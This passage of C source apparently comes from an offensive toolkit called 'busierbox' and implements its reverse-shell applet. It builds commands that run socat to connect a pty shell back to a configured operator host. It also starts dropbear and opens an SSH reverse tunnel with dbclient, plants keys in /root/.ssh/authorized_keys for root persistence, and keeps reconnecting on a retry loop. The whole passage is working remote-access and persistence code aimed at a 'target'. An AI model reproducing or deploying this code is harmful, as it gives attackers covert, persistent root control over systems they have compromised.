                if (!should_reconnect_after_success(reconnect_attempt)) {
                    write_rshell_runtime_status(transport, "exited",
                        initial_attempt + 1, reconnect_attempt, connected_once,
                        rc, policy_stops_after_first_success(BB_RSHELL_SESSION_POLICY) ? "policy-single-complete" : "post-disconnect-retry-limit");
                    return rc;
                }
                sleep((unsigned int)retry_delay_for_attempt(reconnect_attempt));
                reconnect_attempt++;
            }
        }
        fputs("rshell: builtin transport with encryption=none is not implemented\n", stderr);
        return 2;
#else
        fputs("rshell: builtin transport requires wolfSSL; rebuild with BB_BUILTIN_TLS_ENABLE=yes\n", stderr);
        return 2;
#endif
    }
    if (!strcmp(BB_RUNTIME_MODE, "core-only")) {
        fprintf(stderr, "rshell: transport '%s' requires staged payload tools but runtime mode is core-only\n", transport);
        fputs("rshell: change Runtime mode to 'extract' or 'no-residue' in menuconfig, then rebuild\n", stderr);
#ifndef HAVE_WOLFSSL
        fputs("rshell: for a no-extraction shell, rebuild with BB_BUILTIN_TLS_ENABLE=yes (requires wolfSSL) and transport=builtin\n", stderr);
#endif
        return 127;
    }
    if (!BB_OPERATOR_SERVER_HOST[0]) {
        fputs("rshell: operator host is not configured; set it in menuconfig under Payload Options -> Applet configuration -> Reverse shell\n", stderr);
        return 2;
    }
    if (bb_ensure_payload_dir(payload, sizeof(payload)) != 0) {
        fputs("rshell: payload unavailable; cannot start reverse shell transport\n", stderr);
        return 127;
    }
    snprintf(dropbear, sizeof(dropbear), "%s/bin/dropbear", payload);
    snprintf(payload_lib, sizeof(payload_lib), "%s/lib", payload);
    snprintf(busybox, sizeof(busybox), "%s/bin/busybox", payload);
    snprintf(dbclient, sizeof(dbclient), "%s/bin/dbclient", payload);
    snprintf(dropbearkey, sizeof(dropbearkey), "%s/bin/dropbearkey", payload);
    snprintf(socat, sizeof(socat), "%s/bin/socat", payload);
    snprintf(hostkey, sizeof(hostkey), "%s/etc/dropbear/dropbear_rsa_host_key", payload);
    snprintf(identity, sizeof(identity), "%s/home/.ssh/id_dbclient", payload);
    snprintf(authkeys, sizeof(authkeys), "%s/home/.ssh/authorized_keys", payload);
    snprintf(rootssh, sizeof(rootssh), "%s", "/root/.ssh");
    select_rshell_shell(shell_cmd, sizeof(shell_cmd), payload);

    if (!strcmp(transport, "socat")) {
        if (!path_exec(socat)) {
            fputs("rshell: socat transport requires staged socat; enable socat in Heavy tools and rebuild\n", stderr);
            return 127;
        }
        if ((!strcmp(BB_RSHELL_SHELL_PROVIDER, "payload-busybox-sh") ||
             !strcmp(BB_RSHELL_SHELL_PROVIDER, "payload-busybox-ash")) && !path_exec(busybox)) {
            fputs("rshell: selected shell provider requires staged BusyBox\n", stderr);
            return 127;
        }
        if (!strcmp(BB_RSHELL_SHELL_PROVIDER, "payload-zsh")) {
            char zsh_path[PATH_MAX + 16];
            snprintf(zsh_path, sizeof(zsh_path), "%s/bin/zsh", payload);
            if (!path_exec(zsh_path)) {
                fputs("rshell: shell provider payload-zsh requires staged zsh; enable zsh in Heavy tools and rebuild\n", stderr);
                return 127;
            }
        }
        if (!strcmp(BB_RSHELL_SHELL_PROVIDER, "custom") && !BB_RSHELL_CUSTOM_SHELL[0]) {
            fputs("rshell: shell provider custom requires BB_RSHELL_CUSTOM_SHELL\n", stderr);
            return 2;
        }
        strcat(cmd, "LD_LIBRARY_PATH=");
        shquote_append(cmd, sizeof(cmd), payload_lib);
        strcat(cmd, "${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}; export LD_LIBRARY_PATH; ");
        if (!strcmp(BB_RSHELL_ENCRYPTION, "tls")) {
            char _socat_target[512];
            snprintf(_socat_target, sizeof(_socat_target), "%s:%s,verify=0", BB_OPERATOR_SERVER_HOST, BB_RSHELL_SOCAT_PORT);
            strcat(cmd, "exec ");
            shquote_append(cmd, sizeof(cmd), socat);
            strcat(cmd, " OPENSSL:");
            shquote_append(cmd, sizeof(cmd), _socat_target);
            strcat(cmd, " EXEC:");
            shquote_append(cmd, sizeof(cmd), shell_cmd);
            strcat(cmd, ",pty,stderr,setsid,sigint,sane");
        } else {
            /* plaintext — only when explicitly allowed */
            if (strcmp(BB_RSHELL_ALLOW_PLAINTEXT, "yes")) {
                fputs("rshell: socat plaintext requires BB_RSHELL_ALLOW_PLAINTEXT=yes (insecure/debug only)\n", stderr);
                return 2;
            }
            fputs("rshell: WARNING: starting PLAINTEXT socat shell — insecure/debug only\n", stderr);
            {
                char _socat_target[512];
                snprintf(_socat_target, sizeof(_socat_target), "%s:%s", BB_OPERATOR_SERVER_HOST, BB_RSHELL_SOCAT_PORT);
            strcat(cmd, "exec ");
            shquote_append(cmd, sizeof(cmd), socat);
            strcat(cmd, " TCP:");
            shquote_append(cmd, sizeof(cmd), _socat_target);
            strcat(cmd, " EXEC:");
            shquote_append(cmd, sizeof(cmd), shell_cmd);
            strcat(cmd, ",pty,stderr,setsid,sigint,sane");
            }
        }
        {
            int initial_attempt = 0;
            int reconnect_attempt = 0;
            int connected_once = 0;
            for (;;) {
                time_t started_at, ended_at;
                write_rshell_runtime_status(transport,
                    connected_once ? "reconnecting" : "connecting",
                    initial_attempt + 1, reconnect_attempt, connected_once,
                    -1, connected_once ? "post-disconnect-retry" : "pre-connect-retry");
                started_at = time(NULL);
                rc = system(cmd);
                ended_at = time(NULL);
                if (rc == -1)
                    rc = 1;
                else if (WIFEXITED(rc))
                    rc = WEXITSTATUS(rc);
                else
                    rc = 1;
                if (connection_was_established(rc, started_at, ended_at))
                    connected_once = 1;
                write_rshell_runtime_status(transport, connected_once ? "disconnected" : "connect-failed",
                    initial_attempt + 1, reconnect_attempt, connected_once,
                    rc, connected_once ? "session-disconnected" : "connect-failed");
                if (!connected_once) {
                    if (!should_retry_after_attempt(initial_attempt)) {
                        write_rshell_runtime_status(transport, "exited",
                            initial_attempt + 1, reconnect_attempt, connected_once,
                            rc, "initial-retry-limit");
                        return rc;
                    }
                    sleep((unsigned int)retry_delay_for_attempt(initial_attempt));
                    initial_attempt++;
                    continue;
                }
                if (!should_reconnect_after_success(reconnect_attempt)) {
                    write_rshell_runtime_status(transport, "exited",
                        initial_attempt + 1, reconnect_attempt, connected_once,
                        rc, policy_stops_after_first_success(BB_RSHELL_SESSION_POLICY) ? "policy-single-complete" : "post-disconnect-retry-limit");
                    return rc;
                }
                sleep((unsigned int)retry_delay_for_attempt(reconnect_attempt));
                reconnect_attempt++;
            }
        }
    }

    if (!path_exec(dropbear) || !path_exec(dbclient)) {
        fputs("rshell: dropbear/dbclient are not staged; enable dropbear in Heavy tools and rebuild\n", stderr);
        return 127;
    }
    if (access(identity, R_OK) != 0) {
        fprintf(stderr, "rshell: dbclient identity not staged at %s; prepare reverse shell defaults in menuconfig and rebuild\n", identity);
        return 127;
    }

    /* Check if rshell is already running using recorded PID files */
    {
        char dbclient_pid_path[PATH_MAX];
        long existing_pid = -1;
        char dummy_mode[8] = "";
        const char *guard = autorun_guard_path();
        snprintf(dbclient_pid_path, sizeof(dbclient_pid_path), "%s/dbclient.pid", guard);
        if (read_lock_pid(dbclient_pid_path, &existing_pid, dummy_mode, sizeof(dummy_mode)) == 0
                && existing_pid > 1 && kill((pid_t)existing_pid, 0) == 0) {
            printf("rshell_status=already-active\n");
            printf("rshell_dbclient_pid=%ld\n", existing_pid);
            fputs("rshell: already running; use 'busierbox rshell stop' then 'start' to restart\n", stderr);
            return 0;
        }
    }

    {
        char _log_dir[PATH_MAX];
        snprintf(_log_dir, sizeof(_log_dir), "%s", autorun_guard_path());
        bb_mkdir_p(_log_dir, 0700);
        strcat(cmd, "set -eu; ");
        strcat(cmd, "mkdir -p ");
        shquote_append(cmd, sizeof(cmd), _log_dir);
        strcat(cmd, " ");
    }
    strcat(cmd, "$(dirname ");
    shquote_append(cmd, sizeof(cmd), hostkey);
    strcat(cmd, "); ");
    if (!strcmp(BB_RSHELL_AUTHKEYS_MODE, "root-copy")) {
        append_rshell_ledger_setup(cmd, sizeof(cmd));
        strcat(cmd, "mkdir -p ");
        shquote_append(cmd, sizeof(cmd), rootssh);
        strcat(cmd, "; ");
        strcat(cmd, "if [ -f ");
        shquote_append(cmd, sizeof(cmd), authkeys);
        strcat(cmd, " ] && [ ! -f /root/.ssh/authorized_keys ]; then if cp ");
        shquote_append(cmd, sizeof(cmd), authkeys);
        strcat(cmd, " /root/.ssh/authorized_keys 2>/dev/null; then chmod 600 /root/.ssh/authorized_keys 2>/dev/null || true; bbx_ledger write /root/.ssh/authorized_keys external root-copy ''; fi; fi; ");
    } else if (!strcmp(BB_RSHELL_AUTHKEYS_MODE, "root-merge")) {
        append_rshell_ledger_setup(cmd, sizeof(cmd));
        strcat(cmd, "mkdir -p ");
        shquote_append(cmd, sizeof(cmd), rootssh);
        strcat(cmd, "; ");
        strcat(cmd, "if [ -f ");
        shquote_append(cmd, sizeof(cmd), authkeys);
        strcat(cmd, " ]; then tmp=/root/.ssh/authorized_keys.busierbox.$$; bak=''; if [ -f /root/.ssh/authorized_keys ]; then bak=/root/.ssh/authorized_keys.busierbox.bak.$$; cp /root/.ssh/authorized_keys \"$bak\" 2>/dev/null && bbx_ledger backup \"$bak\" external root-merge /root/.ssh/authorized_keys || bak=''; fi; { sed '/^# BEGIN BUSIERBOX RSHELL$/,/^# END BUSIERBOX RSHELL$/d' /root/.ssh/authorized_keys 2>/dev/null || true; echo '# BEGIN BUSIERBOX RSHELL'; cat ");
        shquote_append(cmd, sizeof(cmd), authkeys);
        strcat(cmd, "; echo '# END BUSIERBOX RSHELL'; } >$tmp && mv $tmp /root/.ssh/authorized_keys 2>/dev/null && { chmod 600 /root/.ssh/authorized_keys 2>/dev/null || true; bbx_ledger modify /root/.ssh/authorized_keys external root-merge \"$bak\"; } || rm -f $tmp; fi; ");
    }
    if (!strcmp(BB_RSHELL_GENERATE_HOSTKEY_IF_MISSING, "yes")) {
        strcat(cmd, "if [ ! -f ");
        shquote_append(cmd, sizeof(cmd), hostkey);
        strcat(cmd, " ] && [ -x ");
        shquote_append(cmd, sizeof(cmd), dropbearkey);
        strcat(cmd, " ]; then ");
        shquote_append(cmd, sizeof(cmd), dropbearkey);
        strcat(cmd, " -t rsa -f ");
        shquote_append(cmd, sizeof(cmd), hostkey);
        strcat(cmd, " >/dev/null 2>&1 || true; fi; ");
    }
    strcat(cmd, "if [ ! -f ");
    shquote_append(cmd, sizeof(cmd), hostkey);
    strcat(cmd, " ]; then echo 'rshell: missing Dropbear host key; enable pre-generated host key or allow runtime host-key generation' >&2; exit 2; fi; ");
    {
        char _db_log[PATH_MAX], _dc_log[PATH_MAX];
        char _dropbear_bind[256], _remote_forward[512], _server_login[512], _connect_hint[256];
        const char *_guard = autorun_guard_path();
        snprintf(_db_log, sizeof(_db_log), "%s/dropbear.log", _guard);
        snprintf(_dc_log, sizeof(_dc_log), "%s/dbclient.log", _guard);
        snprintf(_dropbear_bind, sizeof(_dropbear_bind), "%s:%s", BB_OPERATOR_TARGET_BIND_HOST, BB_OPERATOR_TARGET_DROPBEAR_PORT);
        snprintf(_remote_forward, sizeof(_remote_forward), "127.0.0.1:%s:%s:%s",
                 BB_OPERATOR_REMOTE_FORWARD_PORT, BB_OPERATOR_TARGET_BIND_HOST, BB_OPERATOR_TARGET_DROPBEAR_PORT);
        snprintf(_server_login, sizeof(_server_login), "%s@%s", BB_OPERATOR_SERVER_USER, BB_OPERATOR_SERVER_HOST);
        snprintf(_connect_hint, sizeof(_connect_hint), "echo connect_hint='ssh -p %s root@127.0.0.1'; ",
                 BB_OPERATOR_REMOTE_FORWARD_PORT);

        shquote_append(cmd, sizeof(cmd), dropbear);
        strcat(cmd, " -r ");
        shquote_append(cmd, sizeof(cmd), hostkey);
        strcat(cmd, " -p ");
        shquote_append(cmd, sizeof(cmd), _dropbear_bind);
        strcat(cmd, " -F -E >");
        shquote_append(cmd, sizeof(cmd), _db_log);
        strcat(cmd, " 2>&1 & dbpid=$!; ");
        shquote_append(cmd, sizeof(cmd), dbclient);
        strcat(cmd, " -i ");
        shquote_append(cmd, sizeof(cmd), identity);
        if (!strcmp(BB_OPERATOR_KNOWN_HOSTS_POLICY, "off"))
            strcat(cmd, " -y");
        strcat(cmd, " -K 30 -N -R ");
        shquote_append(cmd, sizeof(cmd), _remote_forward);
        strcat(cmd, " -p ");
        shquote_append(cmd, sizeof(cmd), BB_OPERATOR_SERVER_SSH_PORT);
        strcat(cmd, " ");
        shquote_append(cmd, sizeof(cmd), _server_login);
        strcat(cmd, " >");
        shquote_append(cmd, sizeof(cmd), _dc_log);
        strcat(cmd, " 2>&1 & dcpid=$!; ");
        strcat(cmd, "echo rshell_started=yes; echo dropbear_pid=$dbpid; echo dbclient_pid=$dcpid; ");
        strcat(cmd, _connect_hint);
        strcat(cmd, "echo dropbear_log=");
        shquote_append(cmd, sizeof(cmd), _db_log);
        strcat(cmd, "; echo dbclient_log=");
        shquote_append(cmd, sizeof(cmd), _dc_log);
    }

    /* Use popen to capture dropbear and dbclient PIDs from the shell script. */
    {
        FILE *fp;
        char line[512];
        long dropbear_pid = -1, dbclient_pid = -1;
        int exit_status = 0;
        const char *gp = autorun_guard_path();

        fp = popen(cmd, "r");
        if (!fp)
            return 1;
        while (fgets(line, sizeof(line), fp)) {
            fputs(line, stdout);
            fflush(stdout);
            if (strncmp(line, "dropbear_pid=", 13) == 0)
                dropbear_pid = strtol(line + 13, NULL, 10);
            else if (strncmp(line, "dbclient_pid=", 13) == 0)
                dbclient_pid = strtol(line + 13, NULL, 10);
        }
        rc = pclose(fp);
        if (rc != -1 && WIFEXITED(rc))
            exit_status = WEXITSTATUS(rc);

        if ((dropbear_pid > 0 || dbclient_pid > 0) && yes_value(BB_AUTORUN_GUARD_ENABLE)) {
            char path[PATH_MAX];
            int lfd;
            time_t now = time(NULL);
            bb_mkdir_p(gp, 0700);

            /* Individual PID files for clean stop/kill */
            if (dropbear_pid > 0) {
                snprintf(path, sizeof(path), "%s/dropbear.pid", gp);
                lfd = open(path, O_CREAT | O_TRUNC | O_WRONLY, 0600);
                if (lfd >= 0) {
                    dprintf(lfd, "pid=%ld\n", dropbear_pid);
                    close(lfd);
                }
            }
            if (dbclient_pid > 0) {
                snprintf(path, sizeof(path), "%s/dbclient.pid", gp);
                lfd = open(path, O_CREAT | O_TRUNC | O_WRONLY, 0600);
                if (lfd >= 0) {
                    dprintf(lfd, "pid=%ld\n", dbclient_pid);
                    close(lfd);
                }
            }

            /* autorun.lock: use dbclient PID so guard detects live tunnel */
            snprintf(path, sizeof(path), "%s/autorun.lock", gp);
            lfd = open(path, O_CREAT | O_TRUNC | O_WRONLY, 0600);
            if (lfd >= 0) {
                dprintf(lfd, "mode=rshell\npid=%ld\nstarted_at=%ld\nartifact_tier=%s\n",
                        dbclient_pid > 0 ? dbclient_pid : dropbear_pid,
                        (long)now, BUSIERBOX_ARTIFACT_TIER);
                close(lfd);
            }

            /* rshell.status for 'busierbox rshell status' */
            snprintf(path, sizeof(path), "%s/rshell.status", gp);
            lfd = open(path, O_CREAT | O_TRUNC | O_WRONLY, 0600);
            if (lfd >= 0) {
                dprintf(lfd,
                    "state=active\ntransport=%s\nencryption=%s\n"
                    "run_mode=%s\nsession_policy=%s\n"
                    "dropbear_pid=%ld\ndbclient_pid=%ld\n"
                    "connect_hint=ssh -p %s root@127.0.0.1\n"
                    "started_at=%ld\n",
                    transport, BB_RSHELL_ENCRYPTION,
                    BB_RSHELL_RUN_MODE, BB_RSHELL_SESSION_POLICY,
                    dropbear_pid, dbclient_pid,
                    BB_OPERATOR_REMOTE_FORWARD_PORT,
                    (long)now);
                close(lfd);
            }
        }
        return exit_status;
    }
}
